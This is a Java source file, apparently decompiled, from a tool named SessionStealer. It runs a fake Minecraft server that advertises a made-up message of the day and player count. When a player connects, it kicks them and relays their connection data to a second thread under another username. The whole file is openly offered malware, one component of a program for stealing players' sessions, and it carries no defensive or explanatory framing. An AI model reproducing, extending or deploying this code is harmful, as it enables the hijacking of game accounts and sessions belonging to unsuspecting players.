package me.Scetch.SessionStealer;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.ServerSocket;
import me.Scetch.SessionStealer.SessionStealer;
import me.Scetch.SessionStealer.ThreadServer;

public class ThreadClient
extends Thread {
    @Override
    public void run() {
        try {
            SessionStealer.log("Listening [" + SessionStealer.fakePort + "]");
            SessionStealer.serverSocket = new ServerSocket(SessionStealer.fakePort);
            while (true) {
                SessionStealer.socketIn = SessionStealer.serverSocket.accept();
                SessionStealer.DIIn = new DataInputStream(SessionStealer.socketIn.getInputStream());
                SessionStealer.DOIn = new DataOutputStream(SessionStealer.socketIn.getOutputStream());
                SessionStealer.log("Connection [" + SessionStealer.socketIn.getRemoteSocketAddress() + "]");
                while (true) {
                    int i;
                    if ((i = SessionStealer.DIIn.read()) == -1) {
                        SessionStealer.log("End of Stream [Client]");
                        break;
                    }
                    if (SessionStealer.closeConnection) {
                        SessionStealer.closeConnection = false;
                        break;
                    }
                    if (i == 254) {
                        SessionStealer.log("Query");
                        SessionStealer.DOIn.write(255);
                        SessionStealer.writeString(String.valueOf(SessionStealer.motd) + "\u00a7" + SessionStealer.fakeOnline + "\u00a7" + SessionStealer.fakeMax, SessionStealer.DOIn);
                        break;
                    }
                    if (i == 1) {
                        SessionStealer.DOIn.write(255);
                        SessionStealer.writeString(SessionStealer.kickMessage, SessionStealer.DOIn);
                        SessionStealer.DOOut.write(1);
                        SessionStealer.DOOut.writeInt(29);
                        SessionStealer.writeString(SessionStealer.minecraftUsername, SessionStealer.DOOut);
                        SessionStealer.writeString("", SessionStealer.DOOut);
                        SessionStealer.DOOut.writeInt(0);
                        SessionStealer.DOOut.writeInt(0);
                        SessionStealer.DOOut.writeByte(0);
                        SessionStealer.DOOut.writeByte(0);
                        SessionStealer.DOOut.writeByte(0);
                        continue;
                    }
                    if (i != 2) continue;
                    ThreadServer threadServer = new ThreadServer(SessionStealer.readString(SessionStealer.DIIn));
                    threadServer.start();
                }
                SessionStealer.log("Closing [" + SessionStealer.socketIn.getRemoteSocketAddress() + "]");
                SessionStealer.DOIn.close();
                SessionStealer.DIIn.close();
                SessionStealer.socketIn.close();
            }
        }
        catch (Exception exception) {
            return;
        }
    }
}
